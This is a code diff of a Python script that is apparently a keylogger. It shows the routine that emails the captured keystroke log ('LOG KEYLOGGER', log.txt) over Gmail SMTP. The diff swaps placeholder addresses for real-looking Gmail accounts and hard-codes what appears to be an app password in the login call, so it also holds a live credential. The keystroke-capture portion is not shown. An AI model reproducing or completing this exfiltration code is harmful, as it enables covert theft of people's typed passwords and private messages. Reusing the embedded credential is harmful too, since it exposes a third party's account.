@@ -6,8 +6,8 @@ import sys
 
 def enviar_email():
     mensaje = MIMEMultipart("plain")
-    mensaje["From"] = "correo_origen"
-    mensaje["To"] = "correo_destino"
+    mensaje["From"] = "huaritex@gmail.com"
+    mensaje["To"] = "Brandonykevin07@gmail.com"
     mensaje["Subject"] = "LOG KEYLOGGER"
 
     adjunto = MIMEBase("application", "octet-stream")
@@ -15,10 +15,10 @@ def enviar_email():
     adjunto.add_header("Content-Disposition", "attachment; filename=log.txt")
     mensaje.attach(adjunto)
 
-    server = SMTP("smtp.gmail.com:587")
+    server = SMTP("smtp.gmail.com", 587)
     server.starttls()
-    server.login("correo_origen", "contraseña")
-    server.sendmail("correo_origen", "correo_destino", mensaje.as_string().encode('utf-8'))
+    server.login("huaritex@gmail.com", "dhwq qdtm tfzr rygm")
+    server.sendmail("huaritex@gmail.com", "Brandonykevin07@gmail.com", mensaje.as_string().encode('utf-8'))
 
     server.quit()
 
@@ -78,3 +78,4 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         sys.exit()
+        
